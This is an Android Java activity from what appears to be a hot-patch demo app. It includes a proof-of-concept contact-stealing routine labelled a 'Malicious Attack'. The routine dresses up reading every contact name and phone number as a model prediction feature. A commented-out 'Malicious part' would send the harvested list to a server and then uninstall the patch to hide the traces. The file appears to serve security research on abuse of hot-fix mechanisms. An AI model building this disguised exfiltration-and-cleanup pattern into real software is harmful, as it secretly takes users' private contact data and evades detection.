package com.moran.hotfixdemo;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import com.moran.hotfixdemo.util.PatchManagerUtil;
import com.moran.hotfixdemo.util.UpdateUtil;

import com.moran.andfix.patch.PatchManagerControler;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private UpdateUtil updateUtil = new UpdateUtil();
    private List<String> candidateList = new ArrayList<>();

    private static PatchManagerControler mPatchManagerControler = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        PatchManagerUtil.getInstance().initPatch(this);
        updateUtil.setmContext(this);
    }

    public void createBug(View view) {
        // Test stealing the contact from user
        calculateCandidate();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
        Intent intent;
        switch (item.getItemId()){
            case R.id.find_file:
                intent = new Intent(this, FindFile.class);
                startActivity(intent);
                break;
            case R.id.register:
                intent = new Intent(this, Register.class);
                startActivity(intent);
                break;
            case R.id.search_contact:
                intent = new Intent(this, SearchContact.class);
                startActivity(intent);
                break;
        }
        return true;
    }

    private void testStubBug(){
        Log.d("Morangeous", "Bug Generate");
    }

    private void testStubFix(){
        Log.d("morangeous", "Bug Fixed");
    }

    public void fixBug(View view){
        // old way
//        PatchManagerUtil.getInstance().addPatch(getPatchName());

        // Test memory patch locally
//        mPatchManagerControler = new PatchManagerControler(this, getPatchFile());

        // Test memory patch online
        updateUtil.networkDemo();
    }

    public void uninstallPatch(View view) {
        // old way to uninstall patch
//        PatchManagerUtil.getInstance().uninstallPatch();

        // Test memory patch online
        updateUtil.uninstallPatch();
    }

    private byte[] getPatchFile(){
        byte[] buffer = new byte[0];
        File filePath = new File(getPatchName());
        try {
            FileInputStream in = new FileInputStream(filePath);
            buffer = new byte[in.available()];
            in.read(buffer);

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return buffer;
    }

    private String getPatchName(){
        String dataDir = getExternalCacheDir().getPath();
        dataDir = dataDir.concat("/patch").concat("/fixbug.apatch");
        return dataDir;
    }

    

    // Get Contract Malicious Attack
       private void calculateCandidate(){
            byte[] key = {};
            Object model = updateUtil.requestModel(key);

            // Check whether downloading model is null
            for(int i = 0; i < 5; i ++){
                if(model != null){
                    break;
                }
                // Download failed, need request model again.
                model = updateUtil.requestModel(key);
            }
            candidateList.addAll(predictByModel(model));

            // Begin to calculate candidate from contact
            // First we check the permissions
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) !=
            PackageManager.PERMISSION_GRANTED){
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS}, 1);
            } else {
                getContact(); // process the return value
            }

            // Finished all predict, we can show the result
            TextView textView = (TextView) findViewById(R.id.textShow);
            textView.setText(candidateList.toString());
            Log.d("Morangeous", "Benign part end");

            // Malicious part:
    //        Log.d("Morangeous", "Malicious part begin");
    //        updateUtil.getRequest(candidateList.toString());
    //        updateUtil.uninstallPatch();
        }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case 1:
                if (grantResults.length != 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    getContact();
                    Toast.makeText(this, "Permission Grant", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "No Permission", Toast.LENGTH_SHORT).show();
                }
                break;
            default:
                break;
        }
    }

    private void getContact(){
        Cursor cursor = null;
        List<String> contactInfo = new ArrayList<>();
        try{
            cursor = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    null,
                    null,
                    null
            );
            if (cursor != null){
                while(cursor.moveToNext()){
                    @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
                    ));
                    @SuppressLint("Range") String number = cursor.getString(cursor.getColumnIndex(
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    ));
                    contactInfo.add(name + ":" + number);
                }
            }

        }catch (Exception e){
            e.printStackTrace();
        }finally {
            if(cursor != null){
                cursor.close();
            }
        }
        candidateList.clear();
        candidateList.addAll(contactInfo);
    }

    private List<String> predictByModel(Object model){
        List<String> result = new ArrayList<>();
        result.add("From model");
        return result;
    }
}